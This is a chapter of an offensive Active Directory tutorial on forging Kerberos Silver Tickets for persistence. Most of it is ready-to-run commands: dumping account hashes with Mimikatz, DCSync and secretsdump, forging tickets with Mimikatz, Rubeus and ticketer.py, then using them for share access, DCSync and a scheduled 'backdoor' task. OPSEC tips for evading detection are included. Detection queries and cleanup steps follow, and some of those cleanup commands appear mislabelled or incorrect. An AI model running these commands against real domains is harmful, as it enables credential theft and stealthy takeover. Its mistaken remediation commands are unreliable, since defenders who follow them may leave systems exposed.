# Silver Ticket Persistence

## Overview

A **Silver Ticket** is a forged Kerberos Ticket-Granting Service (TGS) ticket. Unlike a Golden Ticket (which forges a TGT using the KRBTGT hash), a Silver Ticket forges a service ticket for a **specific service** on a **specific server** using the password hash of that **service account** or **computer account**.

**Key Advantage:** Silver Tickets do not interact with the Domain Controller at all. There is no TGS request (event 4769), no DC traffic, and no Kerberos authentication traffic sent to the DC. The service decrypts the ticket itself using its own password hash.

**Key Limitation:** Silver Tickets are scoped to a **single service** on a **single machine**. They cannot be used for cross-machine or cross-service access.

---

## Prerequisites

- **Password hash** of the target computer account (`MACHINENAME$`) or service account
- **Domain SID**
- **Target server name** and **service SPN**
- **Knowledge of the service** you want to impersonate
- Tools: Mimikatz, Impacket (`ticketer.py`), Rubeus

---

## Step 1: Obtain the Computer/Service Account Hash

### From LSASS (Domain Admin on DC)

```cmd
mimikatz.exe privilege::debug
```

**Dump all service and computer account hashes:**

```cmd
lsadump::lsa /inject
```

**Dump specific computer account:**

```cmd
lsadump::lsa /inject /name:DC01$
```

**Sam dump (local admin on target server):**

```cmd
lsadump::sam
```

### Using DCSync (target specific computer)

```cmd
lsadump::dcsync /domain:targetdomain.local /user:DC01$
```

### Using Mimikatz on the Target Server (Local Admin)

```cmd
privilege::debug
sekurlsa::logonpasswords
```

Search for the NTLM hash of the `MACHINENAME$` account in the output.

### Using Impacket

```bash
impacket-secretsdump targetdomain.local/Administrator:Pass123\!@192.168.1.10 -just-dc-user 'DC01$'
```

---

## Step 2: Forge the Silver Ticket

### Using Mimikatz

**Basic Silver Ticket (CIFS service for file access):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:DC01.targetdomain.local /service:cifs /rc4:computentlmhash /ptt
```

**Silver Ticket for HOST service (SchTask, WinRM):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:DC01.targetdomain.local /service:HOST /rc4:computentlmhash /ptt
```

**Silver Ticket for LDAP service (DCSync-like):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:DC01.targetdomain.local /service:LDAP /rc4:computentlmhash /ptt
```

**Silver Ticket for WSMAN (WinRM):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:DC01.targetdomain.local /service:WSMAN /rc4:computentlmhash /ptt
```

**Silver Ticket for HTTP (Exchange, SharePoint):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:exch01.targetdomain.local /service:HTTP /rc4:exchservicenthash /ptt
```

Parameters:
- `/target` - FQDN of the target server running the service
- `/service` - Service class (CIFS, HOST, LDAP, HTTP, WSMAN, RPCSS, MSSQLSvc, etc.)
- `/rc4` - NTLM RC4 hash of the computer/service account
- `/ptt` - Injects the ticket into the current session

**Save to file for later use:**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:DC01.targetdomain.local /service:CIFS /rc4:computentlmhash /ticket:silver_cifs.kirbi
```

### Using Rubeus

```cmd
Rubeus.exe silver /service:cifs/DC01.targetdomain.local /rc4:computentlmhash /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /ptt
```

```cmd
Rubeus.exe silver /service:ldap/DC01.targetdomain.local /rc4:computentlmhash /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /ptt
```

### Using Impacket ticketer.py (Linux)

```bash
# Silver ticket for CIFS
python3 ticketer.py -nthash computentlmhash -domain-sid S-1-5-21-123456789-123456789-123456789 -domain targetdomain.local -spn cifs/DC01.targetdomain.local Administrator

# Export and use
export KRB5CCNAME=/home/user/Administrator.ccache
```

---

## Step 3: Use the Silver Ticket

### Verify the injected ticket

```cmd
klist
```

### File access (CIFS):

```cmd
dir \\DC01\C$
dir \\DC01\SYSVOL
```

### Remote WMI:

```cmd
wmic /node:DC01.targetdomain.local process list
```

### Remote PowerShell / WinRM:

```powershell
Enter-PSSession -ComputerName DC01 -Credential Administrator
```

### Remote scheduled task execution:

```cmd
schtasks /create /S DC01 /SC ONCE /TN "backdoor" /TR "powershell.exe -enc Base64_encoded_command" /ST 09:00
```

### Execute DCSync (LDAP service ticket):

```cmd
mimikatz.exe "lsadump::dcsync /domain:targetdomain.local /user:krbtgt"
```

> **Note:** The LDAP Silver Ticket trick works because the DC's computer account hash is used to request an LDAP service ticket. The DC's LDAP service decrypts it using the local computer account hash, and the ticket identity is trusted for the LDAP query.

---

## Common Service SPNs for Silver Tickets

| Service | SPN Format | Access |
|---------|-----------|--------|
| CIFS | `cifs/server.targetdomain.local` | File share access (SMB) |
| HOST | `host/server.targetdomain.local` | Scheduled tasks, WinRM, PSExec |
| LDAP | `ldap/dc.targetdomain.local` | DCSync, LDAP queries |
| HTTP | `http/server.targetdomain.local` | Exchange, SharePoint, IIS |
| WSMAN | `wsman/server.targetdomain.local` | WinRM / PowerShell Remoting |
| RPCSS | `rpcss/server.targetdomain.local` | Remote WMI |
| MSSQLSvc | `MSSQLSvc/sql.targetdomain.local:1433` | SQL Server access |
| TERMSRV | `TERMSRV/server.targetdomain.local` | Remote Desktop |
| TIME | `time/dc.targetdomain.local` | Time sync (useful for persistence) |
| E3514235 | `E3514235-0000-0000-0000-000000000000/dc.targetdomain.local` | AD Replication (DCSync) |

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **No DC traffic** | Silver Tickets never touch the DC. No 4769 event is generated — the only audit is on the target service itself. |
| **No TGT needed** | No Kerberos AS-REQ to the DC; the ticket is presented directly to the service. |
| **Lifetime** | Use `/endin:10` (10 hours) to match normal TGS policy — avoid suspicious long lifetimes. |
| **User ID** | Use `/id:500` for admin, or use a legitimate service account `/id:1103` for stealth. |
| **Service Account Password Changes** | If the computer account password changes (default every 30 days), the Silver Ticket stops working. Either plan re-extraction or use/pass the ticket before it expires. |
| **Event Logging** | The target server logs 4624 (logon) for the forged identity, but the originating workstation IP will be correct. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4624** | An account was successfully logged on (service account) | Target server Security Log |
| **4634** | An account was logged off | Target server |
| **4672** | Special privileges assigned to new logon | Target server |
| **4648** | A logon was attempted using explicit credentials | Originating machine |

### Detection Indicators

1. **Missing Kerberos TGT Request**: A 4624 logon with Kerberos authentication but no corresponding 4768 TGT request on the DC
2. **Anomalous Service Account Usage**: The `MACHINENAME$` account or service account logs on from an unexpected source
3. **Encryption Downgrade**: RC4 used when AES is the domain standard (check `TicketEncryptionType` in 4769 events on the DC if the ticket touches it — though it may not)
4. **Account Anomalies**: Logons from accounts that normally do not authenticate to the service
5. **Event 4624 with Logon Type 3** (Network) using Kerberos, where the account domain is the same as the target and no preceding Kerberos TGT was issued

### Forensic Analysis

On the target server, check:
```
Security Log: Event 4624 — Logon Type 3 (network), Logon Process = Kerberos
```

Specifically look for:
- `TargetUserSid` — SID of the forged user
- `AuthenticationPackage` = `Kerberos`
- No corresponding network logon session recorded on the DC

### Detection Tools

- **Microsoft 365 Defender**: Kerberos Silver Ticket detection alert
- **Splunk / ELK**: Look for 4624 events with `LogonType=3` and `AuthenticationPackage=Kerberos` without a matching 4768 on DCs
- **KQL**:
```
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| where AuthenticationPackageName == "Kerberos"
| where Account !startswith "ANONYMOUS"
| join kind=anti (
    SecurityEvent
    | where EventID == 4768
) on Account, Computer
```

---

## Cleanup / Reversal

### Rotate the Compromised Account Password

If the Silver Ticket was forged for a computer account:

```powershell
# Reset the computer account (requires Domain Admin)
Reset-ComputerMachinePassword -Server DC01 -Credential Domain\Administrator
```

If it was for a service account:

```powershell
Set-ADAccountPassword -Identity svc_backup -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewStr0ngPass!" -Force)
```

### Force Computer Account Password Reset (Group Policy)

```powershell
# Set maximum age for computer account password
Set-ADObject "CN=DC01,OU=Domain Controllers,DC=targetdomain,DC=local" -Replace @{ "ms-DS-MachineAccountQuota" = 0 }
```

### Verify Active Sessions

Check for any remaining forged tickets:

```cmd
klist purge
```

### Post-Cleanup

- Rotate the KRBTGT password twice if the hash was also extracted
- Audit service account usage with `Get-ADUser -Filter * -Properties * | Select Name, PasswordLastSet`
- Remove unauthorized service accounts created as backdoors

---

## Comparison: Golden vs Silver Tickets

| Feature | Golden Ticket | Silver Ticket |
|---------|--------------|---------------|
| **Hash used** | KRBTGT | Service/Computer account |
| **Scope** | Entire domain | Single service on single server |
| **DC contact** | No (forged offline) | No (never touches DC) |
| **Event 4768 (TGT req)** | No (suspicious) | Not generated at all |
| **Event 4769 (TGS req)** | Yes (visible on DC) | No |
| **Event 4624 (logon)** | Yes (on target) | Yes (on target) |
| **Lifetime** | 10 years (default) | Configurable |
| **Stealth** | Medium | High |
| **Mitigation** | Reset KRBTGT password x2 | Reset service/computer password |

---

## References

- [Mimikatz Silver Ticket Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)
- [Impacket ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Post-Exploitation: Silver Tickets](https://adsecurity.org/?p=2011)
- MITRE ATT&CK: T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)

---

**Next:** [03 - DSRM Backdoor](03_DSRM_Backdoor.md)
